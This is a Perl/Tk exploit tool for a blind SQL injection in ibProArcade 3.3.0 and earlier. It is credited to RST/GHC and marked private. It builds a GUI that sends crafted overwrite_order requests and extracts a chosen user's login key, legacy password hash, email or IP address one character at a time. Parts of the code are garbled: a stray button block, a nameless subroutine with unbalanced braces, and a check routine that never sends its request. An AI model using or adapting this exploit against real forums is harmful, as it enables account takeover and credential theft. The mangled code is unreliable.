ibProArcade <= 3.3.0 Remote SQL Injection Exploit
=================================================



#!/usr/bin/perl

## ibProArcade <= v3.3.0 sql injection exploit
## (c)oded by 1dt.w0lf


##        THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
##                   KEEP IT PRIVATE

use Tk;
use Tk::BrowseEntry;
use Tk::DialogBox;
use LWP::UserAgent;

BEGIN {
if($^O eq &#039;MSWin32&#039;){
require Win32::Console;
Win32::Console::Free();
}
}

$mw = new MainWindow(title => "r57ibProArcade" );

$mw->geometry ( &#039;420x310&#039; ) ;
$mw->resizable(0,0);

$mw->Label(-text => &#039;!&#039;, -font => &#039;{Webdings} 22&#039;)->pack();
$mw->Label(-text => &#039;ibProArcade sql injection exploit by RST/GHC&#039;, -font => &#039;{Verdana} 7 bold&#039;,-foreground=>&#039;red&#039;)->pack();
$mw->Label(-text => &#039;&#039;)->pack();

$fleft=$mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;ne&#039;) ;
$fright=$mw->Frame()->pack ( -side => &#039;left&#039;, -anchor => &#039;nw&#039;) ;

$url = &#039;http://127.0.0.1/ipb216/index.php&#039;;
$user_id = &#039;1&#039;;
$column = &#039;member_login_key&#039;;
$report = &#039;&#039;;
$true = 0;
$false = 0;

$fleft->Label ( -text => &#039;Path to forum index: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$url) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;

$fleft->Label ( -text => &#039;User ID: &#039;, -font => &#039;{Verdana} 8 bold&#039; ) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;


$fright->Label( -text => &#039; &#039;)->pack();
$fleft->Label( -text => &#039; &#039;)->pack();

$fleft->Label ( -text => &#039;get data from database&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;green&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Label( -text => &#039; &#039;)->pack();

$fleft->Label ( -text => &#039;Get data from column: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$b = $fright->BrowseEntry( -relief => "groove", -variable => \$column, -font => &#039;{Verdana} 8&#039;);
$b->insert("end", "member_login_key");
$b->insert("end", "name");
$b->insert("end", "ip_address");
$b->insert("end", "legacy_password");
$b->insert("end", "email");
$b->pack( -side => "top" , -anchor => &#039;w&#039; );

$fleft->Label ( -text => &#039;Returned data: &#039;, -font => &#039;{Verdana} 8 bold&#039;) ->pack ( -side => "top" , -anchor => &#039;e&#039; ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => &#039;{Verdana} 8&#039;, -textvariable => \$report) ->pack ( -side => "top" , -anchor => &#039;w&#039; ) ;


$fright->Label( -text => &#039; &#039;)->pack();

$fright->Button(-text    => &#039;Test forum vulnerability&#039;,
                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
                -command => \&test_vuln
               )->pack();

                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
               )->pack();

$fright->Button(-text    => &#039;Get data from database&#039;,
                -relief => "groove",
                -width => &#039;30&#039;,
                -font => &#039;{Verdana} 8 bold&#039;,
                -activeforeground => &#039;red&#039;,
                -command => \&get_data
               )->pack();



$fleft->Label( -text => &#039; &#039;)->pack();
$fleft->Label( -text => &#039;+++ PRIV8 +++&#039;, -font => &#039;{Verdana} 7&#039;)->pack();
$fleft->Label( -text => &#039;(c)oded by 1dt.w0lf&#039;, -font => &#039;{Verdana} 7&#039;)->pack();
$fleft->Label( -text => &#039;RST/GHC&#039;, -font => &#039;{Verdana} 7&#039;)->pack();

MainLoop();

sub get_data()
{
$true = &get_true();

$report = &#039;&#039;;  
$s_num=1;
while(($chr = &found(0,255))!=0){
$report .= chr($chr);
$mw->update();
$s_num++;
}
if(length($report) > 0) { &report(&#039;That\&#039;s all ;)&#039;); }
else { &report(&#039;Can\&#039;t get data from database&#039;); }

}

sub test_vuln()
{
$InfoWindow=$mw->DialogBox(-title   => &#039;test forum vulnerability&#039;, -buttons => ["OK"]);
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => $url, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;

$true = &get_true();
$false = &get_false();

if($true != $false) { $InfoWindow->add(&#039;Label&#039;, -text => &#039;FORUM VULNERABLE&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack; }
else { $InfoWindow->add(&#039;Label&#039;, -text => &#039;FORUM UNVULNERABLE&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;green&#039;)->pack; }

$InfoWindow->Show();
$InfoWindow->destroy;
}

sub get_true()
{
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?autocom=arcade&overwrite_sort=added&overwrite_order=,(-gid*(1=1))");
if($res->as_string =~ /g=(\d+)" target="hiddenframe"><img src=".\/arcade\/images\/addfav.gif"/) { $rep = $1; }
return $rep;
}

sub get_false()
{
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?autocom=arcade&overwrite_sort=added&overwrite_order=,(-gid*(1=2))");
if($res->as_string =~ /g=(\d+)" target="hiddenframe"><img src=".\/arcade\/images\/addfav.gif"/) { $rep = $1; }
return $rep;
}
 
{
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => $url, -font => &#039;{Verdana} 8&#039;)->pack;
$InfoWindow->add(&#039;Label&#039;, -text => &#039;&#039;, -font => &#039;{Verdana} 8&#039;)->pack;
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?autocom=arcade&overwrite_sort=added&overwrite_order=r57r0x");
if($res->is_success)
 {
 $rep = &#039;&#039;;
 if($res->as_string =~ /from (.*)games_list/)
 {
 }
 else
 {
 }
else
 {
 $InfoWindow->add(&#039;Label&#039;, -text => &#039;Error!&#039;, -font => &#039;{Verdana} 8 bold&#039;,-foreground=>&#039;red&#039;)->pack;
 $InfoWindow->add(&#039;Label&#039;, -text => $res->status_line, -font => &#039;{Verdana} 8&#039;)->pack;
 }
$InfoWindow->Show();
$InfoWindow->destroy;  
}

sub found($$)
 {
 my $fmin = $_[0];
 my $fmax = $_[1];
 if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
 
 $r = int($fmax - ($fmax-$fmin)/2);
 $check = " BETWEEN $r AND $fmax";
 if ( &check($check) ) { &found($r,$fmax); }
 else { &found($fmin,$r); }
 }
 
sub crack($$)
 {
 my $cmin = $_[0];
 my $cmax = $_[1];
 $i = $cmin;
 while ($i<$cmax)
  {
  $crcheck = "=$i";
  if ( &check($crcheck) ) { return $i; }
  $i++;
  }
 $i = 0;
 return $i;
 }
 
sub check($)
 {
 $n++;
 $rep = &#039;&#039;;
 $ccheck = $_[0];
 $xpl = LWP::UserAgent->new( ) or die;
 if($res->as_string =~ /g=(\d+)" target="hiddenframe"><img src=".\/arcade\/images\/addfav.gif"/) { $rep = $1; }
 if($rep == $true) { return 1; }
 else { return 0; }
 }
 
sub report()
{
$InfoWindow=$mw->DialogBox(-title   => &#039;Report&#039;, -buttons => ["OK"]);
$InfoWindow->add(&#039;Label&#039;, -text => $_[0], -font => &#039;{Verdana} 7&#039;)->pack;
$InfoWindow->Show();
$InfoWindow->destroy;
}



